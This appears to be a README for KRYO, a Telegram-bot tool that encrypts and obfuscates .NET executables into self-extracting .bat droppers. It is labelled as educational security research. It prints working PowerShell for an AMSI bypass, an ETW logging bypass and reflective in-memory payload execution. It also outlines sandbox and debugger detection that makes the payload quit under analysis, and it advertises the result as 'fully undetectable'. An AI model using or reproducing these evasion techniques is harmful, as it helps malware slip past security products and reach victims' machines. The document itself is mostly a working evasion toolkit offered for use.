## 📖 What is KRYO?

KRYO is a **Telegram bot-based payload testing harness** built for **educational security research**. It takes a .NET assembly (EXE/DLL), applies multiple layers of encryption, obfuscation, and anti-analysis techniques, then produces a self-extracting `.bat` dropper.

**Why?** So security researchers can:
- Understand how modern evasion techniques work
- Test detection capabilities of security products in a lab environment
- Learn about AMSI bypasses, ETW evasion, sandbox detection, and process injection
- Study polymorphic code generation and multi-layer encryption
- And Learn frm it kinda.

## 🔍 Detection Techniques Used

### AMSI Bypass (Reflection-Based)
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
  .GetField('amsiInitFailed','NonPublic,Static')
  .SetValue($null,$true)
```
One-liner. No imports. No Win32 APIs. Sets `amsiInitFailed` to `$true` so AMSI skips scanning entirely.

### ETW Bypass
```powershell
$etw=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$etw.GetField('etwProvider','NonPublic,Static').SetValue($null,$null)
```
Nulls the ETW provider field — PowerShell stops emitting diagnostic events.

### Sandbox Detection (40+ Checks)
- **Hardware:** RAM < 4GB → +2 points, CPU < 2 cores → +2, disk < 20GB → +1
- **VM Tools:** VMwareTools, VBoxService, Parallels, Xen, QEMU → +5 each
- **Debugger:** `Debugger.IsAttached` check, analysis tool process enumeration
- **Timing:** Sleep skew measurement (if sleep takes <20ms → in sandbox)
- **Threshold:** Score > 7 → exit

### Assembly.Load Execution (Maximum FUD)
```powershell
$asm = [System.Reflection.Assembly]::Load($decrypted_payload_bytes)
$asm.EntryPoint.Invoke($null, @())
```
No `VirtualAlloc`. No `WriteProcessMemory`. No `CreateThread`. Pure .NET CLR operations. Call stacks point to `mscorlib.dll` — indistinguishable from legitimate .NET applications.
